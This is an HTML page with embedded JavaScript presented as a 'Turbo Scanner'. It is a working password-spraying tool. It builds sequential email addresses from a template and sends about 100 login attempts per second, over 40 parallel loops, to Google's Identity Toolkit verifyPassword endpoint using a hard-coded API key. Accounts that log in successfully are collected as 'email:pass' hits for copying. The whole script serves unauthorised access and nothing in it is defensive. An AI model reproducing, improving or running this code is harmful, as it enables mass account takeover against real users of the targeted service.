<!DOCTYPE html>
<html>
<head>
    <title>CPM Turbo 100</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #0a0a0a; color: #fff; font-family: sans-serif; text-align: center; padding: 15px; }
        .box { max-width: 500px; margin: auto; background: #111; padding: 20px; border-radius: 12px; border: 1px solid #00ffcc; box-shadow: 0 0 15px rgba(0,255,204,0.2); }
        h2 { color: #00ffcc; text-transform: uppercase; letter-spacing: 2px; }
        
        input { width: 100%; padding: 12px; margin: 8px 0; background: #1a1a1a; border: 1px solid #333; color: white; border-radius: 5px; box-sizing: border-box; outline: none; }
        input:focus { border-color: #00ffcc; }
        
        button { width: 100%; padding: 15px; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
        
        .stats { display: flex; justify-content: space-around; margin: 15px 0; font-size: 14px; color: #aaa; background: #000; padding: 10px; border-radius: 5px; }
        .stats b { font-size: 18px; color: #fff; display: block; }

        #foundList { height: 180px; width: 100%; background: #000; color: #00ffcc; border: 1px solid #00ffcc; border-radius: 5px; padding: 10px; font-size: 12px; font-family: monospace; margin-top: 10px; box-sizing: border-box; }
        
        .copy-btn { background: #222; color: #00ffcc; border: 1px solid #00ffcc; padding: 10px; width: 100%; border-radius: 5px; margin-top: 10px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="box">
    <h2>🚀 TURBO SCANNER</h2>
    <input type="text" id="fmt" placeholder="Format: test_{4}_@gmail.com">
    <input type="text" id="pwd" placeholder="Password to check">
    
    <button id="startBtn" onclick="startScan()">⚡ START SCANNING</button>

    <div class="stats">
        <span>Checked: <b id="count">0</b></span>
        <span>Found: <b id="foundCount" style="color:#00ffcc">0</b></span>
    </div>

    <p style="text-align:left; font-size:12px; color:#00ffcc; margin:0;">✅ HITS (Email:Pass):</p>
    <textarea id="foundList" readonly placeholder="Found accounts will list here..."></textarea>
    
    <button class="copy-btn" onclick="copyResults()">📋 COPY ALL HITS</button>
</div>

<script>
    let scanning = false;
    let checked = 0;
    let found = 0;
    let currentIdx = 0;

    async function startScan() {
        if (scanning) { location.reload(); return; }
        
        let fmt = document.getElementById('fmt').value.trim();
        let pwd = document.getElementById('pwd').value.trim();
        let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

        if (!fmt.includes('{') || !pwd) { alert("Enter Format & Password!"); return; }

        scanning = true;
        document.getElementById('startBtn').innerText = "🛑 STOP / RELOAD";
        document.getElementById('startBtn').style.background = "#ff3333";

        let digitMatch = fmt.match(/\{(\d+)\}/);
        let digitCount = digitMatch ? parseInt(digitMatch[1]) : 4;
        let max = Math.pow(10, digitCount);

        // --- STABLE TURBO (100 Acc/Sec) ---
        let threads = 40; // ഒരേസമയം 40 പാരലൽ കണക്ഷൻസ്

        async function runner() {
            while (scanning && currentIdx < max) {
                let i = currentIdx++;
                let num = i.toString().padStart(digitCount, '0');
                let email = fmt.replace(/\{(\d+)\}/, num);
                
                checkAcc(email, pwd, key);
                
                checked++;
                if (checked % 10 === 0) document.getElementById('count').innerText = checked;
                
                // 100/sec സ്പീഡ് മെയിന്റൈൻ ചെയ്യാൻ ചെറിയ ഡിലേ
                if (checked % 20 === 0) await new Promise(r => setTimeout(r, 100));
            }
        }

        for (let t = 0; t < threads; t++) {
            runner();
        }
    }

    async function checkAcc(email, pwd, key) {
        try {
            let res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${key}`, {
                method: 'POST',
                body: JSON.stringify({ email: email, password: pwd, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            let data = await res.json();

            if (data.idToken) {
                found++;
                document.getElementById('foundCount').innerText = found;
                document.getElementById('foundList').value += email + ":" + pwd + "\n";
                document.getElementById('foundList').scrollTop = document.getElementById('foundList').scrollHeight;
            }
        } catch (err) {}
    }

    function copyResults() {
        let t = document.getElementById("foundList");
        if (!t.value) return;
        t.select();
        document.execCommand("copy");
        alert("Found accounts copied!");
    }
</script>

</body>
</html>
